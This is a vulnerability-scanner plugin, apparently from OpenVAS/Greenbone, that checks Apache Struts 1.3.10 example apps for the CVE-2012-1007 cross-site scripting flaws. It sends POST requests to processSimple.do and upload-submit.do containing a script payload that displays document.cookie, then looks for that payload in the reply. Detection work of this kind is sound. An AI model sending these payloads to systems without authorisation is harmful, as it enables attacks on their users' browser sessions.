# Copyright (C) 2012 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:apache:struts";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802423");
  script_version("2021-04-01T13:03:22+0000");
  script_bugtraq_id(51900);
  script_cve_id("CVE-2012-1007");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2021-04-06 10:08:15 +0000 (Tue, 06 Apr 2021)");
  script_tag(name:"creation_date", value:"2012-02-08 17:33:28 +0530 (Wed, 08 Feb 2012)");
  script_name("Apache Struts <= 1.3.10 CookBook/Examples Multiple XSS Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_apache_struts_consolidation.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("apache/struts/http/detected");

  script_xref(name:"URL", value:"https://web.archive.org/web/20131013214245/http://secpod.org/blog/?p=450");
  script_xref(name:"URL", value:"https://web.archive.org/web/20120430091758/http://secpod.org/advisories/SecPod_Apache_Struts_Multiple_Parsistant_XSS_Vulns.txt");

  script_tag(name:"summary", value:"Apache Struts is prone to multiple cross-site
  scripting (XSS) vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the
  response.");

  script_tag(name:"insight", value:"Multiple flaws exist due to:

  - Input passed via the 'message' parameter in 'processSimple.do' and 'processDyna.do'
  action is not properly verified before it is returned to the user.

  - Input passed via the 'name' and 'queryParam' parameter in
  '/struts-examples/upload/upload-submit.do' action is not properly verified before it is
  returned to the user.");

  script_tag(name:"impact", value:"Successful exploitation could allow an attacker to
  execute arbitrary HTML code in a user's browser session in the context of a vulnerable
  application.");

  script_tag(name:"affected", value:"Apache Struts (cookbook, examples) 1.3.10 and prior.");

  script_tag(name:"solution", value:"Update to version 2.3.3 or later.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

useragent = http_get_user_agent();
host = http_host_name(port:port);

foreach indexpage(make_list("/struts-cookbook/", "/struts-examples/", "/struts-cookbook/welcome.do", "/struts-examples/welcome.do")) {

  res = http_get_cache(item:dir + indexpage, port:port);
  if(!res)
    continue;

  if(">Struts Cookbook<" >< res) {

    found_app = TRUE;

    postdata = "name=xyz&secret=xyz&color=red&message=%3Cscript%3Ealert" +
               "%28document.cookie%29%3C%2Fscript%3E&hidden=Sssh%21+It%" +
               "27s+a+secret.+Nobody+knows+I%27m+here.";

    url = dir + "/processSimple.do";
    req = string("POST ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: ", useragent, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n",
                 "\r\n", postdata);
    res = http_keepalive_send_recv(port:port, data:req);

    if(res =~ "^HTTP/1\.[01] 200" && "<script>alert(document.cookie)</script>" >< res && ">Simple ActionForm Example<" >< res) {
      report = http_report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }

  if(">Struts Examples<" >< res) {

    found_app = TRUE;

    postdata = '-----------------------------7559840272055538773136052934'  +
               '\r\nContent-Disposition: form-data; name="theText"\r\n\r\n' +
               '\r\n-----------------------------7559840272055538773136052' +
               '934\r\nContent-Disposition: form-data; name="theFile"; fil' +
               'ename=""\r\nContent-Type: application/octet-stream\r\n\r\n' +
               '\r\n-----------------------------7559840272055538773136052' +
               '934\r\nContent-Disposition: form-data; name="filePath"\r\n' +
               '\r\n<script>alert(document.cookie)</script>\r\n-----------' +
               '------------------7559840272055538773136052934--\r\n';

    url = dir + "/upload/upload-submit.do?queryParam=Successful";
    req = string("POST ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: ", useragent, "\r\n",
                 "Content-Type: multipart/form-data; boundary=---" +
                 "------------------------7559840272055538773136052934\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n",
                 "\r\n", postdata);
    res = http_keepalive_send_recv(port:port, data:req);

    if(res =~ "^HTTP/1\.[01] 200" && "<script>alert(document.cookie)</script>" >< res && ">File Upload Example<" >< res) {
      report = http_report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

if(found_app)
  exit(99);
else
  exit(0);